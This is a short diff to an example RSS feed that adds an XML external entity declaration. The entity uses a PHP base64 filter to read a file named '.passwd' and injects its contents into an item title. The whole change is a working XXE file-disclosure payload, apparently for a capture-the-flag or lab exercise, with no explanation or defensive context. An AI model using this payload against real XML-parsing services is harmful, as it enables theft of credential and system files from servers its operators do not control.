@@ -1,13 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=.passwd">]>
 <rss version="2.0">
- 
 <channel>
  <title>RSS Title</title>
  <link>http://www.example.com/main.html</link>
  <description>This is an example of an RSS feed</description>
  <item> 
-  <title>XML</title>
+  <title>&xxe;</title>
  </item>
 </channel>
- 
 </rss>
